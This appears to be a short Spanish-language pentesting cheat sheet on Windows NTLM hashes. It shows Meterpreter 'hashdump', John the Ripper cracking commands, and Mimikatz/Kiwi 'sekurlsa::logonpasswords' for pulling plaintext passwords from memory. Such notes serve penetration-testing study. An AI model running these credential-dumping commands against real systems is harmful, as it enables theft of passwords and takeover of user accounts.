### 📝 Descripción

NTLM (NT LAN Manager) es un protocolo de autenticación utilizado en sistemas Windows para la verificación de credenciales. Las contraseñas no se almacenan en texto plano, sino como hashes NTLM, que pueden ser obtenidos y crackeados para acceder a cuentas de usuario.

---

### 🚩 Obtención de Hashes en Windows

#### 🔍 Desde Meterpreter

Una vez en una sesión de **Meterpreter**, podemos obtener los hashes de las contraseñas con:

```bash
hashdump
```

> 🛠️ **Comentario:**
> 
> - Este comando extrae los hashes NTLM del **SAM (Security Account Manager)** de Windows.
> - Se requieren privilegios de administrador o SYSTEM para ejecutar `hashdump`.

---

### 🔓 Crackeo de Hashes con John The Ripper

Después de obtener los hashes, guardamos la salida en un archivo `hashes.txt` y utilizamos **John The Ripper** para intentar descifrarlos:

```bash
john --format=NT hashes.txt
```

> 🛠️ **Comentario:**
> 
> - El formato `NT` se usa para hashes NTLM.
> - Se pueden añadir diccionarios o reglas de fuerza bruta para mejorar el rendimiento.
> - Para ver el progreso o los resultados parciales:
> 
> ```bash
> john --show hashes.txt
> ```
---

### 🗝️ Uso de Mimikatz (Kiwi) en Meterpreter

Podemos cargar el módulo de **Mimikatz** integrado en Metasploit con:

```bash
load kiwi
```

Una vez cargado, ejecutamos el siguiente comando para extraer credenciales en texto plano:

```bash
kiwi_cmd sekurlsa::logonpasswords
```

> 🛠️ **Comentario:**
> 
> - Este comando permite ver las contraseñas de las sesiones activas en memoria.
> - Requiere privilegios elevados (administrador o SYSTEM) para funcionar correctamente.

---
